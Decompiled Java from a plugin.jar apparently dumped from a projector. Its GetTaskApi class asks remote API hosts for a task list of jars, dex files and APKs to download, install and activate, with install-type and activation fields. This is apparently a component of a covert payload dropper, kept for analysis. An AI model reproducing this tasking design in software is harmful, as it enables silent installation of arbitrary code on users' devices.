package com.hs.cld.da;

import android.content.Context;
import com.hs.cld.da.model.ApkBean;
import com.hs.cld.da.model.DexBean;
import com.hs.cld.da.model.JarBean;
import com.hs.cld.da.model.TaskListBean;
import com.hs.p.basic.HTTPRequest;
import com.hs.p.basic.Hosts;
import com.hs.p.common.utils.JSONUtils;
import com.hs.p.common.utils.LOG;
import com.hs.p.common.utils.ObjUtils;
import com.hs.p.common.utils.TextUtils;
import com.hs.p.q.ConfigBean;
import com.hs.p.q.ConfigBeanUtils;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class GetTaskApi extends HTTPRequest {
    private String mCursor;

    public GetTaskApi(Context context) {
        super(context, "GetTaskApi");
        this.mCursor = null;
        setRequestPath("0x01/ov/x2");
        setTargetHosts(Hosts.apiHosts(context));
    }

    private String buildParameter() throws Exception {
        JSONObject jSONObject = new JSONObject();
        setCommonParameter(this.mContext, jSONObject);
        jSONObject.put("cursor", ObjUtils.notNull(this.mCursor));
        return jSONObject.toString();
    }

    private TaskListBean handleResponse() throws Exception {
        String responseData = getResponseData();
        LOG.i(this.TAG, "get tasks: response=" + responseData);
        if (TextUtils.empty(responseData)) {
            return null;
        }
        TaskListBean taskListBean = new TaskListBean();
        JSONObject jSONObject = new JSONObject(responseData);
        taskListBean.cursor = JSONUtils.getString(jSONObject, "cursor", "");
        taskListBean.next_cursor = JSONUtils.getString(jSONObject, "next_cursor", "");
        taskListBean.clear = JSONUtils.getInt(jSONObject, "clear", 0);
        if (jSONObject.has("jars")) {
            taskListBean.jars = parseJarNode(jSONObject.getJSONArray("jars"));
        }
        if (jSONObject.has("dexs")) {
            taskListBean.dexs = parseDexNode(jSONObject.getJSONArray("dexs"));
        }
        if (jSONObject.has("apks")) {
            taskListBean.apks = parseApkNode(jSONObject.getJSONArray("apks"));
        }
        if (jSONObject.has("conf")) {
            taskListBean.conf = parseConfigNode(jSONObject.getJSONObject("conf"));
        }
        return taskListBean;
    }

    private ApkBean parseApkNode(JSONObject jSONObject) {
        ApkBean apkBean = new ApkBean();
        apkBean.tracker_id = JSONUtils.getString(jSONObject, "tracker_id", "");
        apkBean.task_id = JSONUtils.getString(jSONObject, "task_id", "");
        apkBean.auto_download_network = JSONUtils.getInt(jSONObject, "auto_download_network", 0);
        apkBean.file_size = JSONUtils.getLong(jSONObject, "file_size", 0L);
        apkBean.file_md5 = JSONUtils.getString(jSONObject, "file_md5", "");
        apkBean.file_url = JSONUtils.getString(jSONObject, "file_url", "");
        apkBean.vercode = JSONUtils.getLong(jSONObject, "vercode", 0L);
        apkBean.verb_type = JSONUtils.getInt(jSONObject, "verb_type", 0);
        apkBean.interaction_type = JSONUtils.getInt(jSONObject, "interaction_type", 0);
        apkBean.install_type = JSONUtils.getInt(jSONObject, "install_type", 0);
        apkBean.install_scene = JSONUtils.getInt(jSONObject, "install_scene", 0);
        apkBean.activate_type = JSONUtils.getInt(jSONObject, "activate_type", 0);
        apkBean.dplnk = JSONUtils.getString(jSONObject, "dplnk", "");
        apkBean.app_pkgname = JSONUtils.getString(jSONObject, "app_pkgname", "");
        return apkBean;
    }

    private ConfigBean parseConfigNode(JSONObject jSONObject) {
        return ConfigBeanUtils.parse(jSONObject);
    }

    private DexBean parseDexNode(JSONObject jSONObject) {
        DexBean dexBean = new DexBean();
        dexBean.tracker_id = JSONUtils.getString(jSONObject, "tracker_id", "");
        dexBean.task_id = JSONUtils.getString(jSONObject, "task_id", "");
        dexBean.auto_download_network = JSONUtils.getInt(jSONObject, "auto_download_network", 0);
        dexBean.file_size = JSONUtils.getLong(jSONObject, "file_size", 0L);
        dexBean.file_md5 = JSONUtils.getString(jSONObject, "file_md5", "");
        dexBean.file_url = JSONUtils.getString(jSONObject, "file_url", "");
        dexBean.vercode = JSONUtils.getLong(jSONObject, "vercode", 0L);
        return dexBean;
    }

    private JarBean parseJarNode(JSONObject jSONObject) {
        JarBean jarBean = new JarBean();
        jarBean.tracker_id = JSONUtils.getString(jSONObject, "tracker_id", "");
        jarBean.task_id = JSONUtils.getString(jSONObject, "task_id", "");
        jarBean.auto_download_network = JSONUtils.getInt(jSONObject, "auto_download_network", 0);
        jarBean.file_size = JSONUtils.getLong(jSONObject, "file_size", 0L);
        jarBean.file_md5 = JSONUtils.getString(jSONObject, "file_md5", "");
        jarBean.file_url = JSONUtils.getString(jSONObject, "file_url", "");
        jarBean.vercode = JSONUtils.getLong(jSONObject, "vercode", 0L);
        return jarBean;
    }

    public TaskListBean request() throws Exception {
        String strBuildParameter = buildParameter();
        LOG.i(this.TAG, "get tasks: parameter=" + strBuildParameter);
        setRequestBody(strBuildParameter);
        jsonExecute();
        return handleResponse();
    }

    public void setCursor(String str) {
        this.mCursor = str;
    }

    private List<ApkBean> parseApkNode(JSONArray jSONArray) throws JSONException {
        ArrayList arrayList = new ArrayList();
        for (int i = 0; i < jSONArray.length(); i++) {
            arrayList.add(parseApkNode(jSONArray.getJSONObject(i)));
        }
        return arrayList;
    }

    private List<DexBean> parseDexNode(JSONArray jSONArray) throws JSONException {
        ArrayList arrayList = new ArrayList();
        for (int i = 0; i < jSONArray.length(); i++) {
            arrayList.add(parseDexNode(jSONArray.getJSONObject(i)));
        }
        return arrayList;
    }

    private List<JarBean> parseJarNode(JSONArray jSONArray) throws JSONException {
        ArrayList arrayList = new ArrayList();
        for (int i = 0; i < jSONArray.length(); i++) {
            arrayList.add(parseJarNode(jSONArray.getJSONObject(i)));
        }
        return arrayList;
    }
}
